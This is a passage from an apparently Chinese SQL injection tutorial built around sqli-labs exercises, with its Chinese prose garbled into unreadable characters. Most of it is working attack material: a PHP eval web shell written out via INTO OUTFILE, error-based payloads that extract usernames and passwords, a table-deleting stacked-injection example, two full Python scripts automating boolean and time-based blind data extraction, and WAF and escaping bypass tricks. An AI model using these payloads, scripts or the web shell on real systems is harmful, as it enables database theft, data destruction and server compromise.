<pre><code>select database() into outfile â€œ/var/www/html/1.txt&quot;
select &quot;&lt;?php eval($_POST[&#39;LANVNAL&#39;])?&gt;&quot; into outfile &#39;/var/www/html/shell.php&#39;</code></pre>
<h4 id="7ã€æŠ¥é”™è¯­å¥"><a href="#7ã€æŠ¥é”™è¯­å¥" class="headerlink" title="7ã€æŠ¥é”™è¯­å¥"></a>7ã€æŠ¥é”™è¯­å¥</h4><pre><code>1ã€é€šè¿‡UpdateXmlæŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹:
uname=1&#39;and 1=(updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where id=4)),1))
?id=1 and 1=(updatexml(1,(make_set(3,&#39;~&#39;,(database()))),1)) 

2ã€é€šè¿‡flooræŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹:
uname=1&#39;and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);

3ã€é€šè¿‡ExtractValueæŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹:
uname=1&#39;and extractvalue(1, concat(0x5c, (select group_concat(table_name) from information_schema.tables where table_schema=database())))

4ã€é€šè¿‡NAME_CONSTæŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹:
name_const(name,value)å‡½æ•°ä¼šç”¨ä¼ å…¥çš„å‚æ•°è¿”å›ä¸€åˆ—ç»“æœé›†.ä¼ å…¥çš„å‚æ•°å¿…é¡»æ˜¯å¸¸é‡
uname=1&#39;and exists(select * from (select * from(select name_const(version(),0))a join (select name_const(version(),0))b)c)â€”+

5.é€šè¿‡joinæŠ¥é”™çˆ†å­—æ®µ
æ³¨ï¼šè¯¥æ–¹æ³•åœ¨çŸ¥é“è¡¨åçš„æƒ…å†µä¸‹ä½¿ç”¨
select * from (select * from è¡¨å a join è¡¨å b) c
åœ¨å¾—åˆ°ä¸€ä¸ªå­—æ®µåï¼Œä½¿ç”¨usingå¾—åˆ°ä¸‹ä¸€ä¸ªå­—æ®µ
select * from (select * from è¡¨å a join è¡¨å b using (å·²çŸ¥çš„å­—æ®µ,å·²çŸ¥çš„å­—æ®µ)) c  

6.é€šè¿‡expæŠ¥é”™
uname=1&#39;and exp(~(select * from (select user() ) a) )

7.é€šè¿‡GeometryCollection()æŠ¥é”™
uname=1&#39;and geometrycollection((select * from(select * from(select database())a)b)) --+

8.é€šè¿‡polygon()æŠ¥é”™
uname=1&#39;and polygon((select * from(select * from(select database())a)b)) --+

9.é€šè¿‡multipoint()æŠ¥é”™
uname=1&#39;and multipoint((select * from(select * from(select database())a)b)) --+

10.é€šè¿‡multlinestring()æŠ¥é”™
uname=1&#39;and multilinestring((select * from(select * from(select database())a)b)) --+

11.é€šè¿‡multpolygon()æŠ¥é”™
uname=1&#39;and multipolygon((select * from(select * from(select database())a)b)) â€”+

12.é€šè¿‡linestring()æŠ¥é”™
uname=1&#39;and linestring((select * from(select * from(select database())a)b))--+</code></pre>
<h4 id="8ã€å †å æ³¨å…¥-Stacked-injections"><a href="#8ã€å †å æ³¨å…¥-Stacked-injections" class="headerlink" title="8ã€å †å æ³¨å…¥(Stacked injections)"></a>8ã€å †å æ³¨å…¥(Stacked injections)</h4><p>ä»åè¯çš„å«ä¹‰å°±å¯ä»¥çœ‹åˆ°åº”è¯¥æ˜¯ä¸€å † sql è¯­å¥(å¤šæ¡)ä¸€èµ·æ‰§è¡Œã€‚è€Œåœ¨çœŸå®çš„è¿ç”¨ä¸­ä¹Ÿæ˜¯è¿™æ ·çš„, æˆ‘ä»¬çŸ¥é“åœ¨ mysql ä¸­, ä¸»è¦æ˜¯å‘½ä»¤è¡Œä¸­, æ¯ä¸€æ¡è¯­å¥ç»“å°¾åŠ ; è¡¨ç¤ºè¯­å¥ç»“æŸã€‚è¿™æ ·æˆ‘ä»¬å°±æƒ³åˆ°äº†æ˜¯ä¸æ˜¯å¯ä»¥å¤šå¥ä¸€èµ·ä½¿ç”¨ã€‚è¿™ä¸ªå«åš stacked  injectionã€‚<br><strong>åŸç†ï¼š</strong><br>åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äºunion æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚ç”¨æˆ·è¾“å…¥ï¼š<code>1; DELETE FROM products</code>æœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼š<code> Select * from products where productid=1;DELETE FROM products</code>å½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤ã€‚<br><strong>å±€é™æ€§ï¼š</strong><br>å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ°APIæˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼Œå½“ç„¶äº†æƒé™ä¸è¶³ä¹Ÿå¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆæ”»å‡»è€…æ— æ³•ä¿®æ”¹æ•°æ®æˆ–è€…è°ƒç”¨ä¸€äº›ç¨‹åºã€‚</p>
<h4 id="9ã€ç›²æ³¨"><a href="#9ã€ç›²æ³¨" class="headerlink" title="9ã€ç›²æ³¨"></a>9ã€ç›²æ³¨</h4><p>ç›²æ³¨çš„æœ¬è´¨æ˜¯çŒœè§£ã€‚</p>
<p>æˆ‘ä»¬æƒ³å®ç°çš„æ˜¯æˆ‘ä»¬è¦æ„é€ ä¸€æ¡è¯­å¥æ¥æµ‹è¯•æˆ‘ä»¬è¾“å…¥çš„<strong>å¸ƒå°”è¡¨è¾¾å¼</strong>ï¼Œä½¿å¾—å¸ƒå°”è¡¨è¾¾å¼ç»“æœçš„çœŸå‡ç›´æ¥å½±å“æ•´æ¡è¯­å¥çš„æ‰§è¡Œç»“æœï¼Œä»è€Œä½¿å¾—ç³»ç»Ÿæœ‰ä¸åŒçš„ååº”ï¼Œåœ¨æ—¶é—´ç›²æ³¨ä¸­æ˜¯ä¸åŒçš„è¿”å›çš„æ—¶é—´ï¼Œåœ¨å¸ƒå°”ç›²æ³¨ä¸­åˆ™æ˜¯ä¸åŒçš„é¡µé¢ååº”ã€‚</p>
<p>boolç›²æ³¨è„šæœ¬ï¼š</p>
<pre><code class="python">#!/usr/bin/python3
import requests
import string
import sys
global findBit
import binascii

Flag_yes = &quot;You are in&quot;
def sendPayload(payload):
    url = &#39;http://127.0.0.1:8001/Less-5/?id=1&#39;+ payload
    content = requests.get(url).text
    return content
def findDatabaseNumber():
    count = 1
    while count:
        payload = &quot;&#39;AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) =&quot;
        payload = payload + str(count) + &quot;--+&quot;
        recv = sendPayload(payload)
        if Flag_yes in recv:
            return count
        else:
            count += 1
def findTableNumber(dbname):
    count = 1
    dbname = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(dbname)))
    while count:
        payload = &quot;&#39;AND (select count(table_name) from information_schema.tables where table_schema=&quot;+dbname+&quot;) =&quot;
        payload = payload + str(count) + &quot;--+&quot;
        recv = sendPayload(payload)
        if Flag_yes in recv:
            return count
        else:
            count += 1
def findColumnNumber(tableName):
    count = 1
    tableName = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(tableName)))
    while count:
        payload = &quot;&#39;AND (select count(column_name) from information_schema.columns where table_name=&quot;+tableName+&quot;) =&quot;
        payload = payload + str(count) + &quot;--+&quot;
        recv = sendPayload(payload)
        if Flag_yes in recv:
            return count
        else:
            count += 1
def findDataNumber(columnName,tableName):
    count = 1
    while count:
        payload = &quot;&#39;AND (select count(&quot;+columnName+&quot;) from &quot;+tableName+&quot;) =&quot;
        payload = payload + str(count) + &quot;--+&quot;
        recv = sendPayload(payload)
        if Flag_yes in recv:
            return count
        else:
            count += 1


def getDatabaseName(dbNum):
    global findBit
    for k in range(dbNum):
        i = 1
        while i :
            findBit = 0
            doubleSearchDbs(-1,255,i,k)
            i += 1
            if findBit == 1:
                sys.stdout.write(&quot;`\r\n&quot;)
                break
def getTableName(tableNum,dbName):
    global findBit
    dbName = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(dbName)))
    for k in range(tableNum):
        i = 1
        while i :
            findBit = 0
            doubleSearchTable(-1,255,i,k,dbName)
            i += 1
            if findBit == 1:
                sys.stdout.write(&quot;\r\n&quot;)
                break
def getColumnName(columnNum,tableName):
    global findBit
    tableName = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(tableName)))
    for k in range(columnNum):
        i = 1
        while i :
            findBit = 0
            doubleSearchColumn(-1,255,i,k,tableName)
            i += 1
            if findBit == 1:
                sys.stdout.write(&quot;\r\n&quot;)
                break
def getDataName(dataNum,columnName,tableName):
    global findBit
    for k in range(dataNum):
        i = 1
        while i :
            findBit = 0
            doubleSearchData(-1,255,i,k,columnName,tableName)
            i += 1
            if findBit == 1:
                sys.stdout.write(&quot;\r\n&quot;)
                break
def doubleSearchDbs(leftNum,rightNum,i,k):
    global findBit
    midNum = (leftNum + rightNum) / 2
    if (rightNum != leftNum +1):
        querysql = &quot;&#39;AND ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT &quot; + str(k) + &quot;,1),&quot; + str(i) + &quot;,1)) &gt; &quot; + str(midNum) + &quot;--+&quot;
        recv = sendPayload(querysql)
        if Flag_yes in recv:
            doubleSearchDbs(midNum,rightNum,i,k)
        else:
            doubleSearchDbs(leftNum,midNum,i,k)
    else:
        if rightNum != 0:
            sys.stdout.write(chr(int(rightNum)))
            sys.stdout.flush()
        else:
            findBit = 1
            return
def doubleSearchTable(leftNum,rightNum,i,k,dbName):
    global findBit
    midNum = (leftNum + rightNum) / 2
    if (rightNum != leftNum +1):
        querysql = &quot;&#39;AND ASCII(substr((SELECT table_name  FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=&quot;+ dbName+&quot; limit &quot; + str(k) + &quot;,1),&quot; + str(i) + &quot;,1)) &gt; &quot; + str(midNum) + &quot;--+&quot;
        recv = sendPayload(querysql)
        if Flag_yes in recv:
            doubleSearchTable(midNum,rightNum,i,k,dbName)
        else:
            doubleSearchTable(leftNum,midNum,i,k,dbName)
    else:
        if rightNum != 0:
            sys.stdout.write(chr(int(rightNum)))
            sys.stdout.flush()
        else:
            findBit = 1
            return
def doubleSearchColumn(leftNum,rightNum,i,k,tableName):
    global findBit
    midNum = (leftNum + rightNum) / 2
    if (rightNum != leftNum +1):
        querysql = &quot;&#39;AND ascii(substr((SELECT column_name FROM INFORMATION_SCHEMA.columns WHERE TABLE_name=&quot;+ tableName+&quot; limit &quot; + str(k) + &quot;,1),&quot; + str(i) + &quot;,1)) &gt; &quot; + str(midNum) + &quot;--+&quot;
        recv = sendPayload(querysql)
        if Flag_yes in recv:
            doubleSearchColumn(midNum,rightNum,i,k,tableName)
        else:
            doubleSearchColumn(leftNum,midNum,i,k,tableName)
    else:
        if rightNum != 0:
            sys.stdout.write(chr(int(rightNum)))
            sys.stdout.flush()
        else:
            findBit = 1
            return
def doubleSearchData(leftNum,rightNum,i,k,columnName,tableName):
    global findBit
    midNum = (leftNum + rightNum) / 2
    if (rightNum != leftNum +1):
        querysql = &quot;&#39;AND ascii(substr((SELECT &quot;+ columnName+&quot; from &quot; +tableName + &quot; limit &quot; + str(k) + &quot;,1),&quot; + str(i) + &quot;,1)) &gt; &quot; + str(midNum) + &quot;--+&quot;
        recv = sendPayload(querysql)
        if Flag_yes in recv:
            doubleSearchData(midNum,rightNum,i,k,columnName,tableName)
        else:
            doubleSearchData(leftNum,midNum,i,k,columnName,tableName)
    else:
        if rightNum != 0:
            sys.stdout.write(chr(int(rightNum)))
            sys.stdout.flush()
        else:
            findBit = 1
            return
def exp():
    dbNum = findDatabaseNumber()
    print (&quot;the number of database is &quot;+str(dbNum))
    getDatabaseName(dbNum)
    dbName = input(&#39;Find tables from :&#39;)
    tableNum = findTableNumber(dbName)
    print (&quot;the nameber of table is: &quot; + str(tableNum))
    getTableName(tableNum,dbName)
    tableName = input(&#39;Find columns from :&#39;)
    columnNum = findColumnNumber(tableName)
    print (&quot;the number of column is: &quot; + str(columnNum))
    getColumnName(columnNum,tableName)
    columnName = input(&#39;Find data from :&#39;)
    dataNum = findDataNumber(columnName,tableName)
    print (&quot;the number of data is :&quot; + str(dataNum))
    getDataName(dataNum,columnName,tableName)
exp()
</code></pre>
<p>æ—¶é—´å‹ç›²æ³¨è„šæœ¬ï¼š</p>
<pre><code class="python">#!/usr/bin/python3
import requests
import string
import sys
global findBit
import binascii
import time

Flag_yes = &quot;You are in&quot;
s = r&#39;,0123456789abcdefghijklmnopqrstuvwxyz&#39;
url = &#39;http://127.0.0.1:8001/Less-9/?id=1\&#39;&#39;

def sendPayload(payload):
    url = &#39;http://127.0.0.1:8001/Less-9/?id=1\&#39;&#39;+ payload
    #print (url)
    content = requests.get(url).text
    return content

def check(payload):
    url_new = url + payload
    time_start = time.time()
    content = requests.get(url=url_new)
    time_end = time.time()
    if time_end - time_start &gt;3:
        return 1

def getDbNameLength():
    length = &#39;&#39;
    for i in range(1,3):
        for c in range(10):
            payload = &quot;and if(substr(length(database()),%d,1)=&#39;%d&#39;,sleep(3),1)--+&quot; % (i,c)
            if check(payload):
                length += str(c)
                print (length)
    sys.stdout.write(&quot;`\r\n&quot;)
    return int(length)

def getTableLength(dbname):
    length = &#39;&#39;
    dbname = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(dbname)))
    for i in range(1,3):
        for c in range(10):
            payload = &quot;and if(substr(length((select group_concat(table_name) from information_schema.tables where table_schema=&#123;&#125;)),&#123;&#125;,1)=&#39;&#123;&#125;&#39;,sleep(3),1)--+&quot;.format(dbname,i,c)
            if check(payload):
                length += str(c)
                print (length)
    sys.stdout.write(&quot;`\r\n&quot;)
    return int(length)

def getColumnsLength(tbname):
    length = &#39;&#39;
    tbname = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(tbname)))
    for i in range(1,3):
        for c in range(10):
            payload = &quot;and if(substr(length((select group_concat(column_name) from information_schema.columns where table_name=&#123;&#125;)),&#123;&#125;,1)=&#39;&#123;&#125;&#39;,sleep(3),1)--+&quot;.format(tbname,i,c)
            if check(payload):
                length += str(c)
                print (length)
    sys.stdout.write(&quot;`\r\n&quot;)
    return int(length)

def getDataLength(colName,tbName):
    length = &#39;&#39;
    for i in range(1,3):
        for c in range(10):
            payload = &quot;and if(substr(length((select group_concat(&#123;&#125;) from &#123;&#125;)),&#123;&#125;,1)=&#39;&#123;&#125;&#39;,sleep(3),1)--+&quot;.format(colName,tbName,i,c)
            if check(payload):
                length += str(c)
                print (length)
    sys.stdout.write(&quot;`\r\n&quot;)
    return int(length)

def getDatabaseName(dbLength):
    result = &#39;&#39;
    for i in range(1,dbLength + 1):
        for c in s:
            payload = &quot;and if(substr(database(),%d,1)=&#39;%c&#39;,sleep(3),1)--+&quot; % (i,c)
            if check(payload):
                result += c
                break
        print (result)
    sys.stdout.write(&quot;`\r\n&quot;)

def getTablesName(dbName,tbLength):
    result = &#39;&#39;
    dbName = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(dbName)))
    for i in range(1,tbLength+1):
        for c in s:
            payload = &quot;and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#123;&#125;),&#123;&#125;,1)=&#39;&#123;&#125;&#39;,sleep(3),1)--+&quot;.format(dbName,i,c)
            if check(payload):
                result += c
                break
        print (result)
    sys.stdout.write(&quot;`\r\n&quot;)

def getColumnsName(tbName,coLength):
    result = &#39;&#39;
    tbName = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(tbName)))
    for i in range(1,coLength+1):
        for c in s:
            payload = &quot;and if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#123;&#125;),&#123;&#125;,1)=&#39;&#123;&#125;&#39;,sleep(3),1)--+&quot;.format(tbName,i,c)
            if check(payload):
                result += c
                break
        print (result)
    sys.stdout.write(&quot;`\r\n&quot;)

def getDatas(colName,tbName,dataLength):
    result = &#39;&#39;
    for i in range(1,dataLength+1):
        for c in s:
            payload = &quot;and if(substr((select group_concat(&#123;&#125;) from &#123;&#125;),&#123;&#125;,1)=&#39;&#123;&#125;&#39;,sleep(3),1)--+&quot;.format(colName,tbName,i,c)
            if check(payload):
                result += c
                break
        print (result)
    sys.stdout.write(&quot;`\r\n&quot;)


def exp():
    dbLength = getDbNameLength()
    print (&quot;database_name&#39;s length:&#123;&#125;&quot;.format(dbLength))
    getDatabaseName(dbLength)
    dbname = input(&#39;Find tables from :&#39;)
    tbLength = getTableLength(dbname)
    print (&quot;Tables_name&#39;s length:&#123;&#125;&quot;.format(tbLength))
    getTablesName(dbname,tbLength)
    tbname = input(&#39;Find columns from :&#39;)
    coLength = getColumnsLength(tbname)
    print (&quot;columns_name&#39;s length:&#123;&#125;&quot;.format(coLength))
    getColumnsName(tbname,coLength)
    colname = input(&#39;Find datas from :&#39;)
    dataLength = getDataLength(colname,tbname)
    print (&quot;data&#39;s length:&#123;&#125;&quot;.format(dataLength))
    getDatas(colname,tbname,dataLength)
exp()
</code></pre>
<h3 id="ç»•è¿‡æŠ€å·§"><a href="#ç»•è¿‡æŠ€å·§" class="headerlink" title="ç»•è¿‡æŠ€å·§"></a>ç»•è¿‡æŠ€å·§</h3><h4 id="1ã€ç»•è¿‡ç©ºæ ¼è¿‡æ»¤"><a href="#1ã€ç»•è¿‡ç©ºæ ¼è¿‡æ»¤" class="headerlink" title="1ã€ç»•è¿‡ç©ºæ ¼è¿‡æ»¤"></a>1ã€ç»•è¿‡ç©ºæ ¼è¿‡æ»¤</h4><p><strong>a.ä½¿ç”¨æ³¨é‡Šç¬¦</strong></p>
<pre><code>/**/æ›¿ä»£ç©ºæ ¼</code></pre>
<p><strong>b.å¦‚æœè¿‡æ»¤äº†ç©ºæ ¼å’Œæ³¨é‡Šç¬¦</strong></p>
<pre><code>function blacklist($id)
&#123;
    $id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);            //strip out OR (non case sensitive)
    $id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)
    $id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);        //strip out /*
    $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);        //Strip out --
    $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);            //Strip out #
    $id= preg_replace(&#39;/[\s]/&#39;,&quot;&quot;, $id);        //Strip out spaces
    $id= preg_replace(&#39;/[\/\\\\]/&#39;,&quot;&quot;, $id);        //Strip out slashes
    return $id;
&#125;</code></pre>
<p><strong>c.å¯ä»¥ä½¿ç”¨ç‰¹æ®Šä¸­æ–‡å­—ç¬¦ %a0</strong></p>
<pre><code>id=1&#39;%a0union%a0select%a01,user(),3%a0and%a0&#39;1&#39;=&#39;1</code></pre>
<p>è¿™ä¸ªå¯ç®—æ˜¯ä¸€ä¸ªä¸æˆæ±‰å­—çš„ä¸­æ–‡å­—ç¬¦äº†ï¼Œå› ä¸º%a0çš„ç‰¹æ€§ï¼Œåœ¨è¿›è¡Œæ­£åˆ™åŒ¹é…æ—¶ï¼ŒåŒ¹é…åˆ°å®ƒæ—¶æ˜¯è¯†åˆ«ä¸ºä¸­æ–‡å­—ç¬¦çš„ï¼Œæ‰€ä»¥ä¸ä¼šè¢«è¿‡æ»¤æ‰ï¼Œä½†æ˜¯åœ¨è¿›å…¥SQLè¯­å¥åï¼ŒMysqlæ˜¯ä¸è®¤ä¸­æ–‡å­—ç¬¦çš„ï¼Œæ‰€ä»¥ç›´æ¥å½“ä½œç©ºæ ¼å¤„ç†ï¼Œå°±è¿™æ ·ï¼Œæˆ‘ä»¬ä¾¿è¾¾æˆäº†Bypassçš„ç›®çš„ï¼ŒæˆåŠŸç»•è¿‡ç©ºæ ¼+æ³¨é‡Šçš„è¿‡æ»¤ã€‚</p>
<p><strong>d.ä¸­æ–‡å­—ç¬¦é…åˆæ³¨é‡Šç¬¦</strong></p>
<pre><code>union/*%aa*/selectã€‚
è¿™ä¸ªä¸æ˜¯å±äº/*xxx*/åº”è¯¥æ˜¯è¢«é˜²æŠ¤äº†çš„æ€ä¹ˆè¿˜å¯ä»¥å‘¢ï¼Ÿè¿™æ˜¯ä¸­æ–‡å­—ç¬¦çš„ç‰¹æ€§åˆ©ç”¨ï¼Œä¸­æ–‡å­—ç¬¦é…åˆæ³¨é‡Šç¬¦bypass ã€‚åˆ©ç”¨%e4ç­‰åªè¦æ˜¯ä¸­æ–‡å­—ç¬¦å¼€å¤´çš„ï¼Œå°±å¯ä»¥å®Œæˆç»•è¿‡æ£€æµ‹ï¼</code></pre>
<p><strong>e.ä½¿ç”¨æ‹¬å·</strong></p>
<pre><code>seleCt (group_concat(table_name)) from (information_schema.tables) where (table_schema=database())) </code></pre>
<p><strong>f.ä½¿ç”¨åå¼•å·</strong></p>
<pre><code>select `database()`ï¼Œå¯ä»¥ç”¨æ¥è¿‡ç©ºæ ¼å’Œæ­£åˆ™ï¼Œç‰¹æ®Šæƒ…å†µä¸‹è¿˜å¯ä»¥å°†å…¶åšæ³¨é‡Šç¬¦ç”¨</code></pre>
<h4 id="2ã€ç»•è¿‡é»‘åå•è¿‡æ»¤"><a href="#2ã€ç»•è¿‡é»‘åå•è¿‡æ»¤" class="headerlink" title="2ã€ç»•è¿‡é»‘åå•è¿‡æ»¤"></a>2ã€ç»•è¿‡é»‘åå•è¿‡æ»¤</h4><p><strong>a .åŒå†™ç»•è¿‡</strong></p>
<p>wafå°†å…³é”®å­—è¿‡æ»¤äº†çš„æƒ…å†µã€‚</p>
<pre><code>$id= preg_replace(&#39;/UNION/s&#39;,&quot;&quot;, $id); //Strip out UNION</code></pre>
<p><strong>b.å¤§å°å†™ç»•è¿‡</strong></p>
<p>ç”¨äºå¤§å°å†™ä¸æ•æ„Ÿçš„è¿‡æ»¤ã€‚</p>
<pre><code>$id= str_replace(&#39;union&#39;,&#39;&#39;, $id);</code></pre>
<p><strong>c.and/orçš„è¿‡æ»¤</strong></p>
<pre><code>and =&gt; &amp;&amp;
or =&gt; ||</code></pre>
<p><strong>d.ç­‰å·/æ¯”è¾ƒç¬¦çš„è¿‡æ»¤</strong></p>
<pre><code>?id=1&#39; or 1 like 1#   ç»•è¿‡å¯¹ = &gt; ç­‰è¿‡æ»¤
or &#39;1&#39; IN (&#39;1234&#39;)#   æ›¿ä»£=</code></pre>
<p><strong>e.è¿‡æ»¤äº†æ³¨é‡Šç¬¦</strong></p>
<p>é—­åˆå‰åå¼•å·ã€‚</p>
<pre><code>$reg = &quot;/#/&quot;;
$reg1 = &quot;/--/&quot;;
$replace = &quot;&quot;;
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);

$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></pre>
<pre><code>id=-1&#39; or &#39;1&#39;=&#39;1
id=-1&#39; union select 1,database(),&#39;3</code></pre>
<p><strong>f.å‡½æ•°è¢«è¿‡æ»¤</strong></p>
<pre><code>ç­‰ä»·æ›¿æ¢ï¼š
hex()ã€bin() ==&gt; ascii()
sleep() ==&gt;benchmark()
concat_ws()==&gt;group_concat()
mid()ã€substr() ==&gt; substring()

é€ä½æ¯”è¾ƒï¼š
substring()å’Œsubstr()è¢«è¿‡æ»¤ï¼š
?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74
substr((select &#39;password&#39;),1,1) = 0x70
strcmp(left(&#39;password&#39;,1), 0x69) = 1
strcmp(left(&#39;password&#39;,1), 0x70) = 0
strcmp(left(&#39;password&#39;,1), 0x71) = -1</code></pre>
<p><strong>g.è¿‡æ»¤äº†union/where/limit</strong></p>
<p>æ¯æ¬¡å–ä¸€ä¸ªå€¼æ¯”è¾ƒã€‚</p>
<pre><code>id=1 &amp;&amp; (select user from users where id=1)=&#39;admin&#39;
id=1 &amp;&amp; (select user from users limit 1) = &#39;admin&#39;
id=1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &#39;admin&#39;</code></pre>
<h4 id="3ã€ç»•è¿‡addslashes-å‡½æ•°"><a href="#3ã€ç»•è¿‡addslashes-å‡½æ•°" class="headerlink" title="3ã€ç»•è¿‡addslashes()å‡½æ•°"></a>3ã€ç»•è¿‡addslashes()å‡½æ•°</h4><p>å¯ä»¥ç”¨å®½å­—èŠ‚æ¥ç»•è¿‡ã€‚</p>
<p>mysqlåœ¨ä½¿ç”¨GBKç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦ä¸ºä¸€ä¸ªæ±‰å­—ï¼Œä¾‹å¦‚%aa%5cå°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼ˆå‰ä¸€ä¸ªasciiç å¤§äº128æ‰èƒ½åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰ã€‚åŸç†å¤§æ¦‚æ¥è¯´å°±æ˜¯ï¼Œä¸€ä¸ªåŒå­—èŠ‚ç»„æˆçš„å­—ç¬¦ï¼Œæ¯”å¦‚ä¸€ä¸ªæ±‰å­—â€˜æˆ‘â€™çš„utf8ç¼–ç ä¸º%E6%88%91 å½“æˆ‘ä»¬ä½¿ç”¨?id=-1%E6â€™ è¿™æ ·çš„æ„é€ æ—¶ï¼Œâ€™ å‰é¢åŠ çš„ \ å°±ä¼šå’Œ%E6 åˆåœ¨ä¸€èµ·ï¼Œä½†æ˜¯åˆä¸æ˜¯ä¸€ä¸ªæ­£å¸¸æ±‰å­—ï¼Œä½†æ˜¯èµ·åˆ°äº†æ³¨æ‰ \ çš„ä½œç”¨</p>
<blockquote>
<p> addslashes()ä¼šåœ¨å•å¼•å·å‰åŠ ä¸€ä¸ª\ æ¥è½¬ä¹‰å¼•å·ã€‚</p>
</blockquote>
<p>ç»•è¿‡æ–¹æ³•ï¼š</p>
<p>1ã€å®½å­—èŠ‚ä½¿\æ‹¼æ¥æˆä¸­æ–‡å­—ç¬¦é€ æˆè½¬ç§»å¤±æ•ˆ</p>
<p>2ã€æ„é€  %**%5c%5c%27çš„æƒ…å†µï¼Œåé¢çš„%5cä¼šè¢«å‰é¢çš„%5cç»™æ³¨é‡Šæ‰ã€‚</p>
<h4 id="4ã€ç»•è¿‡mysql-real-escape-string-å‡½æ•°"><a href="#4ã€ç»•è¿‡mysql-real-escape-string-å‡½æ•°" class="headerlink" title="4ã€ç»•è¿‡mysql_real_escape_string()å‡½æ•°"></a>4ã€ç»•è¿‡mysql_real_escape_string()å‡½æ•°</h4><p>mysql_real_escape_string() å‡½æ•°è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚</p>
<p>ä¸‹åˆ—å­—ç¬¦å—å½±å“ï¼š</p>
<pre><code>\x00
\n
\r
\
&#39;
&quot;
\x1a</code></pre>
<p>å¦‚æœæˆåŠŸï¼Œåˆ™è¯¥å‡½æ•°è¿”å›è¢«è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚</p>
<p>å¯ç”¨<strong>å®½å­—èŠ‚</strong>ç»•è¿‡ã€‚</p>
<h4 id="5ã€ç¼–ç ç»•è¿‡"><a href="#5ã€ç¼–ç ç»•è¿‡" class="headerlink" title="5ã€ç¼–ç ç»•è¿‡"></a>5ã€ç¼–ç ç»•è¿‡</h4><p>åœ¨å¼•å·æˆ–ç‰¹å®šè¯è¢«è¿‡æ»¤æ—¶ï¼Œä½¿ç”¨urlencodeï¼Œascii(char)ï¼Œhexï¼Œunicodeç­‰ç¼–ç ç»•è¿‡</p>
<pre><code>or 1=1                    =&gt;        %6f%72%20%31%3d%31
/tmp/test.txt        =&gt;        char(68,58,92,116,101,115,116,46,116,120,116)

åå…­è¿›åˆ¶
security                =&gt;        0x7365637572697479

åŒé‡ç¼–ç 
?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+

